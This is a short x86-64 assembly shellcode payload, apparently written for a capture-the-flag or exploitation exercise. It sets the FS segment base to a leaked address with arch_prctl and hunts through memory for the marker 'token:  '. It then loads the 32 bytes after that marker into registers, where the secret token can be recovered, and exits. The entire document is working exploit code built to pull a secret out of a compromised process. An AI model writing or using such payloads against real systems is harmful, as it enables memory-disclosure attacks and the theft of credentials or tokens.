BITS 64

global _start

section .text
	_start:

	mov rsi, r13
	mov rax, 0x9e
	mov rdi, 0x1002
	syscall
	
	xor rax, rax

	searchloop:

	; Using the leak in r12 loop until we find "token:  "
	mov rbx, [fs: rax]
	add rax, 1
	cmp ebx, 0x656b6f74
	jne searchloop

	shr rbx, 0x20
	cmp ebx, 0x20203a6e
	jne searchloop

	; At this point we have found the egg
	add rax, 7
	mov rbx, [fs:rax]

	add rax, 8
	mov rcx, [fs:rax]

	add rax, 8
	mov rdx, [fs:rax]

	add rax, 8
	mov rsi, [fs:rax]

	mov rax, 0xe7
	syscall

	; concat rbx:rcx:rdx:rsi and you will have the token
end:
